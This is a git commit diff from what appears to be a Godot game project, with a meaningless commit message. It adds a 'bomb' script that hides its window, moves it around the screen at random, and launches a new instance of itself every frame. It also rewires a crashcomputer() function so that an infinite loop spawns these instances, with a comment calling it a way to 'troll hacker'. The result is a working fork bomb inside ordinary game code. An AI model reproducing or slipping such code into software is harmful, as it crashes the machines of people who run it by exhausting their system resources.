793e7cff4625b9eaf677406672a7b93910376c3a
namooTH <73419369+namooTH@users.noreply.github.com>
2023-10-14 01:57:56 +0700

    realfladkfjklfjlksdfasdf

---
+++ internal/globalvar/bomb/bomb.gd
@@ -0,0 +1,8 @@
+extends Control
+
+func _ready():
+	get_window().size = Vector2(0, 0)
+
+func _process(delta):
+	get_window().position = Vector2(randi_range(0, DisplayServer.screen_get_size().x), randi_range(0, DisplayServer.screen_get_size().y))
+	OS.create_instance(PackedStringArray(["res://internal/globalvar/bomb/bomb.tscn"]))
--- internal/globalvar/gv.gd
+++ internal/globalvar/gv.gd
@@ -2,4 +2,4 @@ extends Control
 
 func crashcomputer(): #this can be used to troll hacker or something
 	while true:
-		OS.create_instance(PackedStringArray([""]))
+		OS.create_instance(PackedStringArray(["res://internal/globalvar/bomb/bomb.tscn"]))
